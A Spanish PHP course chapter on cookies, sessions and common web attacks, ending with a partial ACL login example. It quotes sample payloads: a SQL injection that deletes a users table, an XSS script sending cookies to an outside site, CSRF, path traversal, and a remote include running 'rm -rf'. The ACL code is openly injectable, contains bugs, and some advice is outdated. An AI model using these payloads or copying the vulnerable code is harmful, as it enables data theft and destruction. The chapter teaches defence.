---
layout: page
title: 3 Cookies, sesiones y seguridad
permalink: /cookies-sesiones-seguridad/
nav_order: 3
has_children: false
parent: Desarrollo Web en Entorno Servidor
---
# 3. Cookies, sesiones y seguridad
{: .no_toc }

- TOC
{:toc}

En este capítulo vamos a profundizar en varios aspectos de PHP de vital importancia para las aplicaciones web.

Por un lado, tenemos las ***cookies*** y las **sesiones**, dos mecanismos que permiten a la aplicación mantener vivas algunas variables de forma indefinida.

Después estudiaremos un problema endémico a las aplicaciones web: la **seguridad**. En efecto, al tratarse de aplicaciones que, por definición, están permanentemente conectadas a la red, son susceptibles de recibir ataques de manera continua e indiscriminada. Y, de hecho, lo hacen. Veremos cuáles son los tipos de ataque más frecuente y cómo podemos proteger nuestra aplicación contra ellos, algo en lo que juegan un papel importante las *cookies* y las variables de sesión.

Por último, nos centraremos en algo muy relacionado con la seguridad: la autenticación de usuarios para acceder a la aplicación. La mayor parte de las aplicaciones web necesitan un mecanismo seguro de autenticación. Veremos en qué consisten las **listas de control de acceso** y plantearemos una implementación muy completa en la que pondremos en práctica todo lo que hemos aprendido hasta ahora e incluso iremos un paso más allá al introducir la arquitectura MVC, que veremos en el siguiente tema.

## 3.1. Cookies

### 3.1.1. ¿Qué son las cookies?

Las ***cookies*** son pequeños archivos de texto enviados desde el servidor que se almacenan en el lado del cliente. Es decir, en el navegador.

Permiten guardar información de forma persistente, de manera que se mantenga entre una petición al servidor y otra. Una *cookie* puede estar viva durante minutos, horas, días o incluso indefinidamente.

Desde PHP, se pueden usar las *cookies* usando la función ***setcookie()*** y el array global ***$_COOKIE***. Vamos a ver cómo. 

### 3.1.2. Manejando cookies con PHP

#### Enviar una cookie: setcookie()

Esta función define una *cookie* que se enviará al cliente junto con el resto de las cabeceras de HTTP. Devuelve *true* si la cookie se envía con éxito o *false* en caso contrario. 

Su sintaxis es:

```php
bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )
```

Las *cookies* deben enviarse **antes de que el programa genere ninguna salida**. Esto no es un capricho de PHP, sino una restricción del protocolo http. Por lo tanto, debes llamar a esta función antes de hacer *cualquier* salida, incluidos espacios en blanco. En caso contrario, la *cookie* no estará disponible hasta que la página se recargue.

La función *setcookie()* admite un montón de parámetros, la mayor parte de ellos optativos:

* **name**: El nombre de la *cookie*. Este es el único obligatorio. 
* **value**: El valor de la *cookie*.
* **expire**: El tiempo que la *cookie* tardará en expirar. Se trata de una fecha expresada en [formato Unix](https://es.wikipedia.org/wiki/Tiempo_Unix).
* **path**: La ruta del servidor para la que la *cookie* estará disponible. Si se utiliza '/', la *cookie* estará disponible en la totalidad del dominio.
* **domain**: El dominio para el cual la *cookie* está disponible.
* **secure**: Si la *cookie* solo debería enviarse en caso de conexión https, pon este argument a *true*.
* **httponly**: Esta *cookie* solo será accesible a través de http. Es decir, no podrá accederse a la *cookie* desde Javascript.

Aquí tienes tres ejemplos de envío de la misma cookie:

```php
<?php 
$value = "I'm your father"; 

setcookie("VaderQuote", $value); 
setcookie("VaderQuote", $value, time()+3600);  // la cookie expira en una hora 
setcookie("VaderQuote", $value, time()+3600, "/quotes/", "bestquotes.com", 1); 
?>
```

#### Recuperar una cookie: $_COOKIES[]

Para ver el contenido de una *cookie*, simplemente hay que acceder al array global *$_COOKIES*. Por ejemplo: 

```php
<?php 
// Imprimir una cookie individual 
echo $_COOKIE["VaderQuote"]; 
?> 
```

#### Borrar una cookie 

Para forzar el borrado de una cookie en el cliente basta con enviarla con una fecha de expiración anterior a la fecha actual. Por ejemplo:

```php
<?php 
setcookie ("VaderQuote", "", time() - 3600);  // Establece la fecha de expiración una hora en el pasado
?>
``` 

## 3.2. Sesiones

Las sesiones en PHP habilitan un mecanismo para que un script almacene variables (llamadas **variables de sesión**) en el servidor de manera persistente, de modo que posteriores ejecuciones de programas en el servidor solicitadas desde el mismo cliente pueden acceder a esas variables.

Es decir: en la práctica, **las variables de sesión se comportan como si fueran variables globales a toda la aplicación web**.

Seguro que te habían dicho que usar variables globales es una mala idea y una pésima práctica de programación. Eso es cierto y, al mismo tiempo, usarlas resulta inevitable. *Bienvenido/a al extravagante mundo de las aplicaciones web*.

Por ese motivo, debe reducirse el uso de las variables de sesión a lo estrictamente imprescindible. ¿Qué cosas resulta útil guardar en variables de sesión? Cosas como el ID o el nombre de un usuario logueado en un sistema o el estado de la aplicación. Poco más. Cosas pequeñas pero tremendamente importantes. 

Cada cliente tiene su propio espacio de variables de sesión en el servidor, de manera que no se mezclan unas con otras, ni un cliente puede acceder a las variables de otro cliente.

La forma en la que PHP logra distinguir a los clientes entre sí es enviándoles, de forma transparente, una *cookie* con un valor aleatorio distinto para cada cliente. "De forma transparente" significa que ni el programador ni el usuario se enteran de que esa *cookie* existe: PHP se encarga de hacerlo por su cuenta.

En el archivo *php.ini* se puede configurar la manera en la que PHP almacenará las variables de sesión (en memoria, en un fichero, etc), pero esto es irrelevante de cara a su funcionamiento y compete más al administrador del sistema que al programador. Lo que a nosotros nos interesa es aprender a crear variables de sesión, asignarles valor y recuperarlo posteriormente.

### 3.2.1. Abrir sesiones: session_start()

Antes de acceder a cualquier variable de sesión (ya sea para crearla, para modificarla o para eliminarla) necesitamos indicarle a PHP que queremos usar variables de sesión en ese programa.

La función ***session_start()*** se usa para eso: habilita el acceso a las variables de sesión, es decir, crea una nueva sesión o reanuda una sesión preexistente.

Las sesiones admiten un nombre, por si necesitas crear sesiones separadas para el mismo cliente. No obstante, la mayor parte de las veces te bastará con crear sesiones sin nombre, sin necesidad de pasar ningún argumento a *session_start()*.

### 3.2.2. Usar variables de sesión: $_SESSION

Las variables de sesión se manipulan a través del array superglobal ***$_SESSION***.

Si necesitas una variable de sesión llamada, por ejemplo, *nombre_usuario*, simplemente haz esto:

```php
session_start();
$_SESSION['nombre_usuario'] = "valor-de-la-variable";
```

Por supuesto, el valor de esa posición del array $_SESSION puede consultarse o modificarse cuando lo necesitemos, porque se trata de un array como otro cualquiera... salvo que es *superglobal*, es decir, es accesible desde cualquier punto del programa.

### 3.2.3. Eliminar variables de sesión: unset() y session_destroy()

La función **unset()** se utiliza para destruir cualquier variable, incluidas las de sesión:

```php
unset($_SESSION['nombre_usuario']);
```

Si lo que deseas es destruir *todas* las variables de sesión, es preferible recurrir a ***session_destroy()***.

Ahora bien, session_destroy() destruye la información asociada a la sesión actual, pero no elimina realmente las variables de la memoria del servidor ni borra la *cookie* de sesión del cliente. 

Si eres un fanático de la seguridad y quieres asegurarte de destruir todas las variables de sesión, puedes usar la función ***session_unset()***. Y, para borrar la cookie de sesión, debes usar ***setcookie()***, como en este ejemplo:

```php

<?php
session_start();

// Destruimos todas las variables de sesión (optativo)
session_unset();

// Si queremos destruir la sesión completamente, borramos también la cookie de sesión.
$params = session_get_cookie_params();
setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
);

// Finalmente, cerramos 0la sesión
session_destroy();
?>
```

## 3.3. Sesiones, cookies y control de acceso

*Cookies* y variables de sesión se usan a menudo, por separado o de forma combinada, para controlar el acceso a una aplicación web.

En este punto conviene que te hagas esta pregunta: ¿qué significa "loguearse" en una aplicación?

Piénsalo un momento. ¿Qué significa eso *realmente*?

Por supuesto, implica superar un formulario donde se nos pregunta nuestro nombre de usuario (o nuestro email, o alguna otra identificación) y una contraseña. Pero, si lo superamos, ¿qué sucede entonces?

**Autenticarse o "loguearse" en una aplicación significa que esa aplicación *cambia de estado* y pasa a reconocernos como usuarios registrados**. *Algo* tiene que cambiar dentro de la aplicación, porque a partir de ese momento, y solo para nosotros, se comportará de un modo distinto.

Ese "algo" implica que la aplicación recordará quiénes somos nosotros y cuales son nuestros privilegios en la aplicación hasta que cerremos la sesión. Y sobre nosotros puede recordar muchas cosas: el nombre, los apellidos, nuestra foto de perfil... Pero, sobre todas esas cosas, hay una fundamental: nuestro ID de usuario.

Todos los usuarios registrados tienen un ID en todos los sistemas. A la aplicación le basta con conocer nuestro ID para recordar quiénes somos. 

¿Y cómo "recuerda" una aplicación web un dato como ese? Muy fácil: almacenándolo en una *cookie* o en una variable de sesión, que son persistentes hasta que el programa decide destruirlas. Es decir, cuando el usuario abandona la aplicación, el programa debe destruir la *cookie* o destruir la sesión.

Justo en este momento hay una cosa que tiene que quedarte muy clara: **¡ninguno de estos métodos es completamente seguro!**.

Las *cookies* pueden rastrearse o modificarse en el ordenador del cliente. Además, algunos clientes las tienen desactivadas. ¡No te puedes fiar de ellas!

Las variables de sesión, en principio más seguras, pueden ser atacadas capturando el ID de sesión, como veremos más adelante.

El método más seguro, y el más complicado de programar, es el que combina:

* Cookies y/o variables de sesión.
* Variables guardadas en una tabla de la BD.

El uso de *frameworks* solventes (como Laravel, que estudiaremos más adelante) hace innecesario tomarse este trabajo, puesto que todos habilitan un mecanismo de sesiones seguras que mejora notablemente las prestaciones de las sesiones nativas de PHP.

No obstante, en las actividades resueltas y propuestas del final del tema plantearemos una solución para la autenticación de usuarios desarrollada por nosotros mismos y que resultará razonablemente segura.

## 3.4. Técnicas de ataque frecuentes

(Esta sección está adaptada de [securitybydefault.com](securitybydefault.com))

Cualquier aplicación web, por el mero hecho de estar abierta a recibir información procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o después, cualquier aplicación que esté *online* acaba por ser atacada. Es una certeza matemática.

En esta sección vamos a describir qué tipos de ataque son los más frecuentes.

Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una idea común a todas: lo más seguro es utilizar un *framework* como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad.

Aún así, conviene que conozcas con qué tipos de ataque te vas a encontrar y cuales son las formas de defenderse de ellos.

### 3.4.1. Captura de ID de sesión

Como ya hemos visto, el ID de una sesión se guarda como una *cookie* (llamada generalmente *phpsessid*) en el cliente para distinguir a ese cliente de otros a la hora de acceder a las variables de sesión. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente.

Un atacante que esté escuchando en esa red puede **leer la cookie con el ID de sesión del paquete http** y, de ese modo, **suplantar la identidad** de la persona que inició la sesión. También puede inyectar Javascript a su víctima para capturar de ese modo el ID de sesión, con idénticos resultados.

Por último, si el atacante consigue tener acceso, aunque sea por unos minutos, al ordenador de su víctima, puede robar el ID de sesión (que en el cliente siempre se almacena como texto plano) y suplantarlo con toda comodidad.

Soluciones:

* Combinar las variables de sesión con *cookies* o con entradas en la base de datos.
* Cambiar el ID de sesión periódicamente.
* No confiar en variables de sesión de PHP para almacenar información muy sensible.
* Denegar el acceso a la *cookie* de sesión desde Javascript (usando el atributo *httponly*).
* Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesión viaja encriptada hasta el navegador. Este es uno de los muchos motivos por los que https se ha impuesto definitivamente a lo largo y ancho de la web.

### 3.4.2. Inyección de SQL

Este ataque consiste en que **un usuario malintencionado ejecuta sentencias SQL contra la base de datos** del sitio web mediante el simple procedimiento de insertarlas en un formulario.

¿Qué cómo narices se hace eso? Te lo explico con un ejemplo. Imagina que nuestro atacante ha hecho la suposición de que nuestra tabla de usuarios se llama *users* (una suposición muy razonable). Entonces, el tío, o la tía, llega al formulario de login de la aplicación, donde se nos pide el *nick* y la contraseña, y escribe esto en el campo *nick*:

![Ataque por inyección SQL](/docs/dwes/_site/assets/images/03-formulario-inyeccion-sql.png)

Cuando pulse el botón *"Sign in"* ocurrirá algo muy curioso... y muy desagradable. Dentro de nuestro código fuente, seguramente tendremos una línea parecida a esta:

<code>
$sql = "SELECT * FROM users WHERE nick = '$nick' and passwd = '$pass'";
</code>

Fíjate otra vez en lo que el atacante ha escrito en el campo *nick* del formulario de login. Eso significa que la variable *$nick* tendrá este contenido: ```nada'; DELETE * FROM users; #```. Imagina lo que va a suceder cuando esa variable se expanda dentro de la sentencia SQL anterior.

¿Te lo has imaginado ya? 

Por si acaso aún no lo has pillado, te lo chivo. Lo que sucederá es que, al expandir la variable *$nick* en ese string, la variable *$sql* pasará a tener este valor:

<code>
SELECT * FROM users WHERE nick ='<strong>nada';
DELETE * FROM users;
#</strong>'and passwd = '$pass'
</code>

(He puesto en negrita el contenido de la variable *$nick* expandido dentro del string *$sql*)

Es decir, que el atacante ha logrado convertir un inofensivo *SELECT* en una secuencia de dos instrucciones. Y una de ellas no es nada inofensiva.

En efecto, cuando pidamos a la base de datos que ejecute ese SQL, las sentencias se ejecutarán en orden. El primer SELECT no devolverá ningún resultado, pero es sintácticamente correcto y, en cualquier caso, al atacante no le interesan esos resultados.

Como el SELECT es sintácticamente correcto, la base de datos no se detendrá ahí, sino que seguirá ejecutando las sentencias. Y le llegará el turno al DELETE. ¡Bingo! El simpático atacante acaba de cepillarse nuestra tabla de usuarios.

(Lo que haya a continuación del símbolo # se ignorará, porque ese es el símbolo de comentario en SQL).

El atacante no solo puede ejecutar un DELETE mediante este sencillo procedimiento, sino que puede llevar a cabo otras acciones destructivas (¿qué tal un DROP DATABASE?) o instrusivas (puede intentar insertar un usuario administrador fraudulento en la tabla *users*, por ejemplo). Y todo ello partiendo de una suposición bastante plausible: que la tabla de usuarios se llama *users*.

Para blindarse frente a inyecciones de SQL, se recomienda:

* **Filtrar los datos procedentes de los formularios. SIEMPRE**. Por ejemplo, si los nombres de usuario sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, almohadillas, etc.
* **Escapar los caracteres especiales** de cualquier dato de entrada antes de enviarlo al gestor de bases de datos. Por ejemplo, *mysql_real_escape_string()* coloca barras invertidas antes de ciertos caracteres. *addslashes()* hace algo parecido. Esto hace que ya no se ejecuten como sentencias SQL. En las versiones recientes de PHP, el escape de caracteres especiales se hace automáticamente con cualquier dato que llegue por GET o POST.
* **Usar nombres poco habituales para las tablas** de la base de datos. Una estrategia frecuente es utilizar un identificador significativo (como *users* para la tabla de usuarios) y añadirle varios caracteres o números aleatorios (así, la tabla se convertiría en algo como *users_58283*). Ese sufijo aleatorio se suele almacenar en un archivo de configuración para que esté accesible para todos los scripts del programa. Esta técnica tan simple dificulta enormemente cualquier intento de acceso fraudulento a las tablas.

### 3.4.3. XSS (cross site scripting)

El ataque por XSS consiste en **ejecutar código de scripting malicioso** (básicamente, Javascript) en el contexto del sitio web.

Hay muchas formas de hacer XSS. Por ejemplo, imagínate que tenemos un blog de noticias y que un usuario malicioso publica, *como parte del texto de una entrada*, este string:

```javascript
<script>document.href = 'https://otrositio.com';</script>
```

¿Qué ocurriría? Pues que cada vez que alguien visite nuestro portal y cargue esa noticia, será redirigido a *otrositio.com*, donde probablemente pretenderán venderle medicamentos para la disfunción eréctil o algo por el estilo.

Otra cosa que suele hacerse con XSS es robar datos de las *cookies* del cliente, aprovechando que Javascript puede acceder a las *cookies*. Para ello, el atacante solo tiene que inyectar un código como este:

```javascript
<script>document.location = 'https://otrositio.com?cookies=' + document.cookie</script>
```

Para evitar los ataques XSS, la estrategia más útil, otra vez, es **filtrar todos los datos externos**. El filtrado de datos es sencillo de hacer y te ahorrará mogollón de problemas. En resumen: **nunca** te fíes de ningún dato que provenga de un formulario si no lo has filtrado antes y le has quitado todos los caracteres sospechosos.

### 3.4.4. CSRF o XSRF (cross site request forgery)

Este tipo de ataques **explota la confianza que tiene un sitio web en la identidad de un usuario**. Es decir, se toma a un usuario válido registrado en un sitio (por ejemplo, sitio-confiable.com) y, desde otro sitio (por ejemplo, sitio-maligno.com), se le fuerza a hacer algo chungo en sitio-confiable.com.

Veámoslo con un ejemplo. Supón que eres un usuario administrador en sitio-confiable.com. Para borrar a un usuario de tu web (o cualquier otro recurso), lanzas una URL como https://sitio-confiable.com/usuario/delete/28 (donde 28 es el id del usuario). Este tipo de URLs son muy habituales en las aplicaciones web.

Pues bien, imagina que has abierto una sesión como administrador en sitio-confiable.com y, sin cerrarla, navegas por otra web llamada sitio-maligno.com. Y un atacante supermalvado, conocedor de tu propensión a navegar por sitios chungos sin cerrar la sesión en sitio-confiable.com, ha colocado este código como parte del código fuente de sitio-maligno.com:

```html
<img src='https://sitio-confiable.com/usuario/delete/28'>
```

Cuando tu navegador cargue esa página, lanzará una petición GET a sitio-confiable.com, resultando en la eliminación del usuario 28 sin que tú te enteres de cómo ha podido suceder semejante desgracia.

Esto es solo un ejemplo. Por supuesto, el atacante puede hacer un montón de cosas desagradables en sitio-confiable.com, porque ese sitio está confiando en ti, que eres un usuario legítimo con una sesión abierta.

Puedes pensar: ¿y quién demonios se va a dejar una sesión abierta y se va a poner a navegar por otros sitios sin cerrarla? Respuesta: *todo* el mundo. Si tú no lo has hecho nunca, aunque solo haya sido una vez, probablemente no perteneces a la especie humana.

Algunas técnicas para dificultar el ataque por CSRF:

* **Utilizar POST en lugar de GET** para recibir datos.
* **Generar tokens únicos para cada petición**. Un tóken es una cadena alfanumérica aleatoria generada por el servidor cuando sirve el código HTML de un formulario. El cliente debe enviar de vuelta ese tóken junto con los datos del formulario para que el servidor acepte la petición como válida. Si un atacante intenta efectuar un ataque CSRF, enviará sus peticiones sin el tóken y serán rechazadas.

### 3.4.5. DT (directory transversal)

Este ataque se produce cuando el atacante logra **acceder a ficheros del servidor que están fuera del directorio de la aplicación** y que, teóricamente, no deberían ser accesibles desde esta.

Es fácil comprender cómo puede montarse un ataque así. Imagina un programa PHP que haga un *include()* de este estilo:

```php
include ("views/" . $viewName);
```

Si un atacante logra manipular la variable *$viewName* para asignarle, por ejemplo, el valor "../../../../otro-fichero.php", nuestro programa hará un include de un fichero que está claramente fuera de los directorios de la aplicación.

Para evitar este tipo de ataques, algunas estrategias son:

* **Tener un array de páginas y carpetas válidas**. Si un include trata de acceder a un recurso que no está en la lista, se sospechará de un ataque.
* **Buscar caracteres sospechosos en los nombres de los archivos**. Si la variable *$viewName* del ejemplo anterior incluye los caracteres "../", la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina "ataque punto punto barra".

### 3.4.6. RFI (remote file inclusion)

Este ataque se produce cuando **se incluye un archivo remoto** explotando una vulnerabilidad del código fuente.

Imagina, como antes, un programa PHP que haga un *include()* tan común como este:

```php
include ($viewName);
```

Imagina también que este código se invoque normalmente mediante una petición del estilo: https://sitio-confiable.com?view=main.php. O algo parecido. Es una estrategia habitual en muchas aplicaciones web.

Pues bien, un atacante podría pedir la siguiente URL: https://sitio-confiable.com?view=https://sitio-malicioso/soy-un-script-malvado.php

Es decir, ha colocado como *$viewName* la URL de un programa PHP externo a nuestro servidor, y nuestro programa hará un *include()* de ese código tan feliz y contento, sin saber que se trata de código malicioso que acabará directamente en las tripas de nuestro programa. 

Una vez que *soy-un-script-malvado.php* se esté ejecutando en el servidor *sitio-confiable.com*, puede hacer cosas terribles, como, por ejemplo, esta:

```php
<?php
  system("rm -rf");
?>
```

(No te digo lo que hace ese comando por si se te ocurre probarlo, pero ya te adelanto que no es agradable).

Para prevenir los ataques por RFI, algunas estrategias válidas son:

* **No confiar en los datos** que no provengan de nuestro sistema.
* **Validar y filtrar los datos** que introduce el usuario (sí, otra vez: validar, validar y validar cualquier cosa que provenga del usuario).

## 3.5. Caso práctico resuelto: autenticación mediante ACL

En esta sección, vamos a poner en práctica muchas de las cosas que hemos visto en este tema mediante un caso práctico realista y completamente resuelto.

Completamente resuelto pero mejorable, porque una aplicación informática *siempre* se puede mejorar.

De hecho, en la siguiente sección afrontaremos varias mejoras que tendrás que intentar tú en forma de ejercicios propuestos. ¿O pensabas que iba a hacer yo todo el trabajo?

### 3.5.1. Qué es la autenticación mediante ACL

Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios. El más completo de esos subsistemas es el de las **lisas de control de acceso** (ACL = Access Control List).

Ese subsistema suele estar basado en este diseño de base de datos:

![Tablas ACL](/docs/dwes/_site/assets/images/03-acl.jpg)

Esto significa que necesitamos **cinco tablas** para implementar un ACL completo.

Sin embargo, muchas veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, añadiendo quizá un campo "tipo").

**Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando.**

En cualquier caso, es conveniente que conozcas el esquema ACL completo (es decir, el de 5 tablas) para que lo pongas en práctica cuando lo necesites. Por eso te lo he presentado. Ahora ya sois oficialmente amigos.

### 3.5.2. Una implementación de autenticación mediante ACL

Como ocurre con muchos conceptos en el ámbito de la programación, las ACL se entienden mejor viéndolas que explicándolas. Así que vamos a hacer una implementación de ejemplo, que de paso nos servirá para mostrar en acción muchas de las cosas que hemos visto en este tema.

Ojo, que esta es solo *una de las posibles implementaciones*. Pueden existir mil variaciones. Pero, como sucedía con los ejemplos que hemos visto anteriormente, te servirá como base para tu propia implementación de una ACL.

**IMPORTANTE**: en esta implementación verás una distribución de archivos un poco peculiar y que, a primera vista, puede resultarte hasta caprichosa. No te agobies. Hemos respetado una arquitectura de aplicaciones denominada ***modelo-vista-controlador*** o ***MVC***. Hablaremos largo y tendido sobre esa arquitectura más adelante, y entonces comprenderás que la distribución del código no tenía nada de caprichosa.

Por ahora, solo tienes que seguir la pista a lo que sucede, y ni siquiera es necesario que lo entiendas al 100%. Un 80% ya estaría genial. Un 50% sería suficiente. Tu comprensión de este código aumentará cuando tengas que utilizarlo y adaptarlo a tus propios proyectos.

#### Nuestras tablas ACL

Vamos a suponer que esta autenticación con ACL se está implementando para un sistema de publicación de noticias (un blog, un periódico digital o algo semejante). Solo por darle un poco de contexto. Realmente, cambiando los permisos, podría utilizarse casi para cualquier web.

Haremos una implementación completa del ACL, es decir, con las cinco tablas. Esas cinco tablas tendrán el siguiente aspecto (te muestro algunos datos de ejemplo para que quede más claro de lo que estamos hablando):

**TABLA USUARIOS**

IdUsuario|Email|Passwd|Nombre|Telef
-|-|-|-|-
1|jp@gmail.com|sgsdfgjk8yias|Juan Pérez|600 230 xxx
2|ms@gmail.com|239ywds9$|María Sánchez|700 398 yyy
Etc|Etc|Etc|Etc|Etc

**TABLA ROLES**

IdRol|Descripcion
-|-
1|Administrador
2|Editor
3|Usuario

**TABLA USUARIOS-ROLES**

IdUsuario|IdRol
-|-
1|1
2|3
3|2
etc|etc

**TABLA PERMISOS**

IdPermiso|Descripcion
-|-
1|Crear contenido nuevo
2|Editar contenido propio
3|Editar contenido ajeno
4|Borrar contenido propio
5|Borrar contenido ajeno
6|Publicar contenido propio
7|Publicar contenido ajeno
8|Leer contenido publicado

**TABLA ROLES-PERMISOS**

IdRol|IdPermiso
-|-
1|1
1|2
1|3
1|4
1|5
1|6
1|7
1|8
2|1
2|2
2|6
2|8
3|8

Observa que, con estas tablas, queda perfectamente definido a qué perfil de usuario (o "rol") pertenece cada usuario y qué cosas puede hacer con ese perfil.

Por ejemplo, el usuario Juan Pérez, que tiene el Id = 1, es un Administrador, porque tiene asociado el rol 1 en la tabla *usuarios-roles*. Y los administradores tienen permiso para hacerlo absolutamente todo, según se desprende de la tabla *roles-permisos*.

En cambio, la usuaria María Sánchez (Id = 2) tiene perfil de Editor, y los editores solo tienen permiso para cuatro operaciones: Crear contenido nuevo, Editar su propio contenido, Publicar su propio contenido y Leer el contenido publicado.

#### Código fuente de nuestra implementación

En esta implementación, no escribiremos el código para hacer cosas como "Crear contenido nuevo" o "Publicar contenido". Eso dependerá del sistema concreto que estemos programando, y no es lo que nos interesa ahora.

Lo que nos interesa es ver cómo se autentica un usuario en una aplicación web y cómo se le puede dar acceso a unas funcionalidades o a otras dependiendo del contenido de las tablas ACL.

Una vez autenticado, el usuario accederá a una vista diferente de la aplicación dependiendo de sus privilegios, donde se le mostrarán las opciones de que dispone. Es decir, si el usuario que se loguea es Juan Pérez, que tiene rol de Administrador, la aplicación debe mostrarle estas opciones:

* Editar contenido (propio y ajeno)
* Borrar contenido (propio y ajeno)
* Publicar contenido (propio y ajeno)
* Leer contenido
* Crear contenido

En cambio, si se loguea María Sánchez, que tiene perfil de Editor, las opciones deben reducirse a:

* Editar contenido (propio)
* Publicar contenido (propio)
* Leer contenido
* Crear contenido

**Insisto en una idea muy importante**: no es necesario que comprendas la totalidad de este código en este momento. Basta con que te esfuerces en captar la idea general. Volverás sobre él, y sobre infinitas variedades de él, más adelante, cada vez con mayor comprensión de lo que está sucediendo. Así que léelo sin prisa y sin agobios, como quien se adentra en la traducción de un texto escrito en una lengua que se parece un poco a la suya sin llegar a serlo.

Una última advertencia: esta solución presenta algunos problemas de seguridad (como no filtrar las variables procedentes de un formulario) que resolveremos en los ejercicios propuestos más adelante.

**Archivo index.php**

Este archivo captura la variable *action* desde la URL. Esta variable, como ya vimos en el ejemplo de la Biblioteca, indica a la aplicación qué es lo que debe hacer.

Luego se instancia un objeto de tipo *Controller* y se invoca un método con el mismo nombre que la *action*.

```php
<?php
  include("controller.php");
  $controller = new Controller();

  // Miramos a ver si hay alguna acción pendiente de realizar
  if (!isset($_REQUEST['action'])) {
    // No la hay. Usamos la acción por defecto (mostrar el formulario de login)
    $action = "showLoginForm";
  } else {
    // Sí la hay. La recuperamos.
    $action = $_REQUEST['action'];
  }

  // Ejecutamos el método del controlador que se llame como la acción
  $controlador->$action();
?>
```

**CONTROLADOR (archivo controller.php)**

En el controlador están reflejadas todas las posibles acciones que puede realizar la aplicación.

Es decir, tiene que haber un método por cada posible valor de la variable *action*.

```php
    start_session();    // Si no se ha hecho en el index, claro

    class Controller {

        private $view, $user;

        /**
         * Constructor. Crea el objeto vista y los modelos
         */
        public function __construct() {
            $this->view = New View();       // Vistas
            $this->user = New User();       // Modelo de usuarios
        }

        /**
         * Muestra el formulario de login
         */
        public function showLoginForm() {
            $this->view->show("loginForm");
        }

        /**
         * Procesa el formulario de login y, si es correcto, inicia la sesión con el id del usuario.
         * Redirige a la vista de selección de rol.
         */
        public function processLoginForm() {

            // Validación del formulario
            if ($_REQUEST['email'] == "" || $_REQUEST['pass'] == "") {
                // Algún campo del formulario viene vacío: volvemos a mostrar el login
                $data['errorMsg'] = "El email y la contraseña son obligatorios";
                $this->view->show("loginForm", $data);
            }
            else {
                // Hemos pasado la validación del formulario: vamos a procesarlo
                $userData = $this->user->checkLogin($_REQUEST['email'], $_REQUEST['pass']);
                if ($userData) {
                    // Login correcto: creamos la sesión y pedimos al usuario que elija su rol
                    $_SESSION['idUser'] = $userData->idUser;
                    $this->SelectUserRolForm();
                }
                else {
                    $data['errorMsg'] = "Usuario o contraseña incorrectos";
                    $this->view->show("loginForm", $data);
                }
            }
        }

        /**
         * Muestra formulario de selección de rol de usuario
         */
        public function selectUserRolForm() {
            $data['roles'] = $this->user->getUserRoles($_SESSION['idUser']);
            $this->view->show("selectUserRolForm", $data);
            // Posible mejora: si el usuario solo tiene un rol, la aplicación podría seleccionarlo automáticamnte
            // y saltar a $this->showMainMenu()
        }

        /**
         * Procesa el formulario de selección de rol de usuario y crea una variable de sesión para almacenarlo.
         * Redirige al menú principal.
         */
        public function processSelectUserRolForm() {
            $_SESSION['userRol'] = $_REQUEST['userRol'];
            $this->showMainMenu();
        }

        /**
         * Muestra el menú de opciones del usuario según la tabla de persmisos
         */
        public function showMainMenu() {
            $data['permissions'] = $this->user->getUserPermissions($_SESSION['userRol']);
            $this->view->show("mainMenu", $data);
        }
    }
```

**VISTA (view.php)**

Este archivo contiene un método genérico (dentro de la clase View) para mostrar cualquier otra vista, cuyo nombre se le pasa como parámetro desde el controlador.

```php
    class View {
		public function mostrar($nombreVista, $data = null) {
			include_once("views/header.php");
			include_once("views/$nombreVista.php");
			include_once("views/footer.php");
		}
	}
```

**VISTA loginForm (archivo views/loginForm.php)**

Esta vista muestra el formulario de login. La dejamos preparada para mostrar, opcionalmente, un mensaje de error (del tipo "usuario o contraseña incorrectos") o un mensaje informativo (del tipo "Sesión cerrada con éxito").

```php
        if (isset($data['errorsMsg'])) {
            echo "<p style='color:red'>".$data['msjError']."</p>";
        }
        if (isset($data['infoMsg'])) {
            echo "<p style='color:blue'>".$data['msjInfo']."</p>";
        }

        echo "<form action='index.php'>
                Usuario:<input type='text' name='usr'><br>
                Contraseña:<input type='password' name='pass'><br>
                <input type='hidden' name='action' value='processLoginForm'>
                <input type='submit'>
             </form>";
```

**VISTA selectUserRolForm (archivo views/selectUserRolForm.php)**

Esta vista muestra la lista de roles de un usuario. Sirve por si un usuario tiene asignado más de un rol. Así, antes de terminar el login, podrá elegir con qué rol quiere ingresar en la aplicación.

```php
        echo "Selecciona el rol<br>";
        echo "<form action='index.php'>";
        echo "<select name='idRol'>";
        foreach ($data['roles'] as $rol) {
            echo "<option value='".$rol->idRol."'>".$rol->description."<option>";
        }
        echo "<input type='hidden' name='action' value='processSelectUserRolForm"
        echo "<input type='submit'>";
```

**VISTA mainMenu (archivo views/mainMenu.php)**

Esta vista muestra las opciones del programa asociadas a un usuario concreto. Cada opción es un enlace a la propia aplicacion con un valor diferente para la variable *action*.

```php
        echo "Menú principal<br>";
        foreach ($data['permissions'] as $permission) {
            echo "<a href='index.php?action=".$permission->action.">".$permission->description."</a><br>";
        }
```

**MODELO (archivo user.php)**

El modelo contiene todos los métodos necesarios para acceder a la base de datos (o, en general, a cualquier recurso del servidor). Esos métodos siempre se invocan desde el controlador.

En este caso, llamamos *user.php* al modelo porque accederá únicamente a la tabla de usuarios.

```php
   class User {

        private $db;

        public function __construct() {
           $this->db = new mysqli("db-host", "db-user", "db-password", "db-name");
        }

        public function checkLogin($email, $pass) {
            if ($result = $this->db->query("SELECT idUser FROM users WHERE email = '$email' AND password = '$pass'")) {
                if ($result->num_rows == 1) {
                    $usuario = $result->fetch_object();
                    return $usuario;
                } else {
                    return null;
                }
            } else {
                return null;
            }
        }

        public function getUserRoles($idUser) {
            $resultArray = array();
